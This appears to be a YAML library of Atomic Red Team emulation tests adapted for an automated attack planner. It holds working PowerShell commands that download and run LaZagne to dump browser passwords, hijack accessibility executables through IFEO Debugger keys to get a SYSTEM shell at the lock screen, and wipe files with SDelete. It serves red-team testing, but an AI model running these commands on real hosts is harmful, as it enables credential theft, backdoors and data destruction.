  - uuid: art-t1555_003-lazagne-browsers
    name: LaZagne - Credentials from Browser
    id:
      - T1555.003
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Credential Access
    technique:
      - 'Credentials from Password Stores: Web Browsers'
    description: |
      LaZagne is a cross-platform credential harvester that reads and
      decrypts browser-stored passwords (Chrome, Firefox, IE/Edge, etc.).
      The `browsers` module dumps decrypted plaintext credentials to
      stdout. Method 3 folds the ART prereq (download LaZagne.exe v2.4.5
      release binary). ART auto_generated_guid
      9a2915b3-3954-4cce-8c76-00fbf4dbd014.
    execution:
      executor: Powershell Executor
      command: |
        $lazagne = "#{lazagne_path}"
        if (-not (Test-Path $lazagne)) {
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          New-Item -ItemType Directory (Split-Path $lazagne) -Force | Out-Null
          Invoke-WebRequest "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -OutFile $lazagne
        }
        & $lazagne browsers
    arguments:
      executor:
        description: The Powershell session ID used to invoke LaZagne.
        required: true
        pddl_index: executor2_var_in_plan
      lazagne_path:
        default: C:\Users\Public\LaZagne.exe
        description: Target-side path where LaZagne is staged and invoked.
        required: true
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (credential-data ?d - data ?target - host)
      - (data-stored-c2 ?d - data)
  - uuid: art-t1546_008-ifeo-accessibility-debugger
    name: Attaches Command Prompt as a Debugger to a List of Target Processes
    id:
      - T1546.008
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Persistence
      - Privilege Escalation
    technique:
      - 'Event Triggered Execution: Accessibility Features'
    description: |
      Uses Image File Execution Options (IFEO) `Debugger` value to attach
      a chosen command (default `cmd.exe`) as the "debugger" for Windows
      accessibility executables (osk.exe, sethc.exe, utilman.exe, etc.).
      Triggering any of these from the lock screen (Shift-5x, Ease-of-
      Access button) then launches the attached command as SYSTEM —
      classic pre-authentication persistence + priv-esc. ART
      auto_generated_guid 3309f53e-b22b-4eb6-8fd2-a6cf58b355a9.
    execution:
      executor: Powershell Executor
      command: |
        $input_table = "#{parent_list}".Split(",")
        $Name = "Debugger"
        $Value = "#{attached_process}"
        foreach ($item in $input_table) {
          $item = $item.Trim()
          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item"
          if (-not (Test-Path $registryPath)) { New-Item -Path $registryPath -Force | Out-Null }
          New-ItemProperty -Path $registryPath -Name $Name -Value $Value -Force | Out-Null
        }
    arguments:
      executor:
        description: The Powershell session ID used to modify IFEO registry keys.
        required: true
        pddl_index: executor2_var_in_plan
      parent_list:
        default: osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe,
          atbroker.exe
        description: Comma-separated accessibility executables to hijack via IFEO
          Debugger.
        required: true
      attached_process:
        default: C:\Windows\System32\cmd.exe
        description: Command hijacked in as the IFEO Debugger for each accessibility
          exe.
        required: true
        pddl_index: string1_var_in_plan
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (command-execution-at-event ?c - string ?target - host)
  - uuid: art-t1485-sdelete-overwrite
    name: Windows - Overwrite file with SysInternals SDelete
    id:
      - T1485
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Impact
    technique:
      - Data Destruction
    description: |
      Sysinternals SDelete overwrites a file with a random pattern before
      deleting it, preventing forensic recovery. Method 3 folds the ART
      prereq (download SDelete.zip from Sysinternals, expand, copy sdelete.exe).
      ART auto_generated_guid 476419b5-aebf-4366-a131-ae3e8dae5fc2.
    execution:
      executor: Powershell Executor
      command: |
        $sdelete = "#{sdelete_exe}"
        if (-not (Test-Path $sdelete)) {
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          $zipPath = "$env:TEMP\SDelete.zip"
          $extractDir = "$env:TEMP\Sdelete"
          Invoke-WebRequest "https://download.sysinternals.com/files/SDelete.zip" -OutFile $zipPath
          Expand-Archive $zipPath $extractDir -Force
          New-Item -ItemType Directory (Split-Path $sdelete) -Force | Out-Null
          Copy-Item "$extractDir\sdelete.exe" $sdelete -Force
        }
        if (-not (Test-Path "#{file_to_delete}")) { New-Item "#{file_to_delete}" -Force | Out-Null }
        & $sdelete -accepteula "#{file_to_delete}"
    arguments:
      executor:
        description: The Powershell session ID used to invoke SDelete.
        required: true
        pddl_index: executor2_var_in_plan
      sdelete_exe:
        default: C:\Users\Public\sdelete.exe
        description: Target-side path where sdelete.exe is staged.
        required: true
      file_to_delete:
        default: C:\Users\Public\wipe-me.txt
        description: Target-side path to the file that SDelete will overwrite and
          delete.
        required: true
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
    effects:
      - (file-deleted ?f - file ?target - host)
